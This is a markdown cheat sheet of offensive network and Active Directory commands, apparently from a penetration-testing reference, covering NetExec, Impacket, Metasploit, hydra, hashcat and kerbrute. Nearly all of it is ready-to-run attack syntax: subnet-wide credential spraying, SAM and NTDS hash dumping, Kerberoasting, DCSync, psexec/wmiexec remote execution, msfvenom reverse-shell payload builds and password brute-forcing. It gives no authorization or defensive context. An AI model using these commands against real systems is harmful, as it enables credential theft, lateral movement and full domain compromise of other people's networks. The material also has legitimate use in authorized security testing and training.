---
category: technique
title: "Network and Active Directory Tools - NetExec, Impacket, Metasploit"
tags: [tools, network, active-directory, netexec, impacket, metasploit, lateral-movement]
---

# Network and Active Directory Tools

## NetExec (nxc)

Tests credentials across an entire subnet at once. The maintained successor to CrackMapExec - use `nxc`, not `cme`.

```bash
pip install netexec

nxc smb 10.0.0.0/24 -u user -p password
nxc smb 10.0.0.0/24 -u user -p password --local-auth
nxc smb 10.0.0.0/24 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:ntlmhash"
nxc smb 10.0.0.1 -u user -p pass --sam
nxc smb 10.0.0.1 -u admin -p pass --ntds
nxc winrm 10.0.0.0/24 -u user -p pass
nxc smb 10.0.0.1 -u user -p pass --shares
nxc smb 10.0.0.1 -u user -p pass -x "whoami"
```

## Impacket

```bash
pip install impacket

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt

# AS-REP Roasting
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 -no-pass -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt wordlist.txt

# DCSync
secretsdump.py domain.local/admin:pass@10.0.0.1

wmiexec.py domain.local/user:pass@10.0.0.1
psexec.py domain.local/user:pass@10.0.0.1
psexec.py -hashes :ntlmhash administrator@10.0.0.1
GetADUsers.py -all domain.local/user:pass -dc-ip 10.0.0.1
```

## Metasploit

```bash
msfconsole

search <vuln name>
use exploit/path/to/module
show options
set RHOSTS 10.0.0.1
set LHOST 10.0.0.2
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

use post/multi/recon/local_exploit_suggester
use post/windows/gather/hashdump

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f elf -o shell
```

## Password attacks

```bash
hydra -l admin -P rockyou.txt ssh://10.0.0.1
hydra -l admin -P rockyou.txt https-post-form://example.com/login:"user=^USER^&pass=^PASS^:Invalid"

hashcat -m 0 hash.txt rockyou.txt      # MD5
hashcat -m 1000 hash.txt rockyou.txt   # NTLM
hashcat -m 1800 hash.txt rockyou.txt   # sha512crypt
hashcat -m 13100 hash.txt rockyou.txt  # Kerberos TGS
hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule
```

## Kerbrute

```bash
which kerbrute || go install github.com/ropnop/kerbrute@latest

kerbrute userenum --dc 10.0.0.1 -d domain.local users.txt
kerbrute passwordspray --dc 10.0.0.1 -d domain.local users.txt 'Password123!'
```
